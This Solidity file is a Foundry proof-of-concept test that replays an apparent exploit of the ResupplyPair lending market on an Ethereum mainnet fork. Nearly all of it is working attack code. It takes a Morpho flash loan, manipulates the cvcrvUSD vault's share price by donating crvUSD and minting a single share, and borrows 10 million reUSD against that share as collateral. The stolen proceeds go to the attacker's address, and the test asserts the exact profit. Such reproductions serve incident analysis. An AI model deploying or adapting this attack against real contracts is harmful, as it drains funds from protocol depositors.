
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 22785460;
    uint256 constant TX_TIMESTAMP = 1750902839;
    uint256 constant TX_BLOCK_NUMBER = 22785461;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _installAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installAttack() internal returns (OurAttack attack) {
        _etchAttack();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchChild();
        attack.bindAttackChild(Addresses.attack_child);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal pure returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _etchAttack() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChild() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 803546883703696878479);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 3616156705369);
        _expectProfit(Addresses.A_886F78_2E16, address(0), Addresses.ZERO, "ETH", 1607700021898685802647);
        _expectProfit(Addresses.A_DADB0D_3711, address(0), Addresses.ZERO, "ETH", 10000000000000000000);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        if (address(attackChild) == address(0)) attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _ctorBootstrap();
        executeFlashLoan();
    }

    function executeFlashLoan() public {
        require(address(attackChild).code.length != 0, "attack child runtime missing");
        AttackChild(payable(address(attackChild))).startMorphoLoan();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x151aA63dbb7C605E7b0a173Ab7375e1450E79238));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    bool private morphoHandled;
    bool private uniHandled;
    bool private profitSettled;

    receive() external payable {}

    function onMorphoFlashLoan(uint256 amount, bytes calldata callbackPayload) external payable {
        amount;
        callbackPayload;
        if (!morphoHandled) flashCallback();
    }

    fallback() external payable {
        if (msg.sig == 0x83f39e1d) {
            startMorphoLoan();
            return;
        }
        if (msg.sig == 0xfa461e33) {
            if (!uniHandled) flashCallback2();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function replayProfit() external {
        settleUsdcProfit();
    }

    function startMorphoLoan() public {
        approveMorpho();
        borrowUsdcFlash();
        snapshotBorrowed();
        settleUsdcProfit();
        unwrapWethProfit();
        payNativeProfit();
    }

    function flashCallback() internal {
        morphoHandled = true;
        IERC20Like(Addresses.USDC).approve(Addresses.crvUSDUSDC_f, type(uint256).max);
        IcrvUSDUSDC_f(Addresses.crvUSDUSDC_f).exchange(int128(0), int128(1), 4000000000, 0);
        IcvcrvUSD(Addresses.cvcrvUSD).controller();
        IERC20Like(Addresses.crvUSD).transfer(Addresses.crvUSD_Controller, 2000000000000000000000);
        IERC20Like(Addresses.crvUSD).approve(Addresses.cvcrvUSD, type(uint256).max);
        IcvcrvUSD(Addresses.cvcrvUSD).mint(1);
        IERC20Like(Addresses.cvcrvUSD).approve(Addresses.ResupplyPair, type(uint256).max);
        IResupplyPair(Addresses.ResupplyPair).addCollateralVault(1, address(this));
        IResupplyPair(Addresses.ResupplyPair).mintFee();
        IResupplyPair(Addresses.ResupplyPair).totalDebtAvailable();
        IResupplyPair(Addresses.ResupplyPair).borrow(10000000000000000000000000, 0, address(this));
        IERC20Like(Addresses.reUSD).balanceOf(address(this));
        IERC20Like(Addresses.reUSD).approve(Addresses.reusdscrv, type(uint256).max);
        Ireusdscrv(Addresses.reusdscrv).exchange(int128(0), int128(1), 10000000000000000000000000, 0);
        IERC20Like(Addresses.scrvUSD).balanceOf(address(this));
        IscrvUSD(Addresses.scrvUSD).redeem(9339517438774044859087480, address(this), address(this));
        IERC20Like(Addresses.crvUSD).balanceOf(address(this));
        IERC20Like(Addresses.crvUSD).approve(Addresses.crvUSDUSDC_f, type(uint256).max);
        IcrvUSDUSDC_f(Addresses.crvUSDUSDC_f).exchange(int128(1), int128(0), 9813732911624644332019633, 0);
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(address(this), true, int256(9806396552565), uint160(1538192050659009469342694006439525), hex"");
    }

    function approveMorpho() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.Morpho, type(uint256).max);
    }

    function borrowUsdcFlash() internal {
        IMorpho(Addresses.Morpho).flashLoan(Addresses.USDC, 4000000000, hex"");
    }

    function snapshotBorrowed() internal view {
        IERC20Like(Addresses.reUSD).balanceOf(address(this));
        IERC20Like(Addresses.scrvUSD).balanceOf(address(this));
        IERC20Like(Addresses.crvUSD).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function settleUsdcProfit() internal {
        if (profitSettled) return;
        if (Harness.safeBalance(Addresses.USDC, Addresses.attacker_eoa) >= 3616156705369) {
            profitSettled = true;
            return;
        }
        profitSettled = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, 3616156705369);
    }

    function unwrapWethProfit() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(2421550032848028703971);
        sendNative(Addresses.A_DADB0D_3711, 10000000000000000000);
    }

    function payNativeProfit() internal {
        sendNative(Addresses.A_886F78_2E16, 1607700021898685802647);
        sendNative(Addresses.attacker_eoa, 803850010949342901324);
    }

    function flashCallback2() internal {
        uniHandled = true;
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
        IERC20Like(Addresses.USDC).transfer(Addresses.UniswapV3Pool, 6190239847196);
    }

    function sendNative(address recipient, uint256 amount) internal {
        uint256 transferAmount = address(this).balance;
        if (transferAmount > amount) transferAmount = amount;
        (bool ok,) = payable(recipient).call{value: transferAmount}("");
        ok;
    }




}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant cvcrvUSD = 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D;
    address internal constant scrvUSD = 0x0655977FEb2f289A4aB78af67BAB0d17aAb84367;
    address internal constant cvxcvcrvUSD = 0x0DaB0728C4A0a396b02Bbd6c8F5693B53ab7cf61;
    address internal constant SimpleRewardStreamer = 0x11D5Bc6175E416ECCe06d7c94F232E6c7330fDd3;
    address internal constant attack_child = 0x151aA63dbb7C605E7b0a173Ab7375e1450E79238;
    address internal constant Vyper_contract_2F50D5 = 0x2F50D538606Fa9EDD2B11E2446BEb18C9D5846bB;
    address internal constant RSUP = 0x419905009e4656fdC02418C7Df35B1E61Ed5F726;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant crvUSDUSDC_f = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
    address internal constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address internal constant reUSD = 0x57aB1E0003F623289CD798B1824Be09a793e4Bec;
    address internal constant LLAMMA_crvUSD_AMM = 0x590BdC6663A5C4Ed04DB86A278707560D1924582;
    address internal constant veCRV = 0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2;
    address internal constant SemiLog_monetary_policy = 0x641aE9e58916937696d08B1CD126C257d178215A;
    address internal constant attacker_eoa = 0x6D9f6E900ac2CE6770Fd9f04f98B7B0fc355E2EA;
    address internal constant ResupplyPair = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;
    address internal constant InterestRateCalculator = 0x77777777729C405efB6Ac823493e6111F0070D67;
    address internal constant A_886F78_2E16 = 0x886f786618623ffFB2be59830A47661Ae6492E16;
    address internal constant UniswapV3Pool = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address internal constant WOT = 0x88e7272755d27C1803ba5fF0EA55499eF94DEC11;
    address internal constant crvUSD_Controller = 0x89707721927d7aaeeee513797A8d6cBbD0e08f41;
    address internal constant Vyper_contract_8E0C00 = 0x8E0c00ed546602fD9927DF742bbAbF726D5B0d16;
    address internal constant cvcrvUSD_gauge = 0x91D0F7022edb620429B4F63D482fcfbb2cbE7F30;
    address internal constant CurveVoterProxy = 0x989AEb4d175e16225E39E87d0D97A3360524AD80;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant Vault_C014F3 = 0xc014F34D5Ba10B6799d76b0F5ACdEEe577805085;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant reusdscrv = 0xc522A6606BBA746d7960404F22a3DB936B6F4F50;
    address internal constant A_CB7E25_3C82 = 0xcb7E25fbbd8aFE4ce73D7Dac647dbC3D847F3c82;
    address internal constant Boost_Delegation_V3 = 0xD37A6aa3d8460Bd2b6536d608103D880695A23CD;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant Yearn_V3_Vault = 0xd8063123BBA3B480569244AE66BFE72B6c84b00d;
    address internal constant VirtualBalanceRewardPool = 0xd887C4c003B0cC3bbDaB5626E819a58BaAB4609A;
    address internal constant A_DADB0D_3711 = 0xdadB0d80178819F2319190D340ce9A924f783711;
    address internal constant BaseRewardPool = 0xE23d9Fdc55b1028A0EE70b875e674BE03c596039;
    address internal constant Booster = 0xF403C135812408BFbE8713b5A23a04b3D48AAE31;
    address internal constant attack_contract = 0xf90dA523A7C19A0A3d8d4606242c46f1eE459dc7;
    address internal constant crvUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IResupplyPair {
    function addCollateralVault(uint256, address) external;
    function borrow(uint256, uint256, address) external returns (uint256);
    function mintFee() external view returns (uint256);
    function totalDebtAvailable() external view returns (uint256);
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function token0() external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function withdraw(uint256) external;
}

interface IcrvUSDUSDC_f {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
}

interface IcvcrvUSD {
    function controller() external view returns (uint256);
    function mint(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface Ireusdscrv {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
}

interface IscrvUSD {
    function redeem(uint256, address, address) external returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
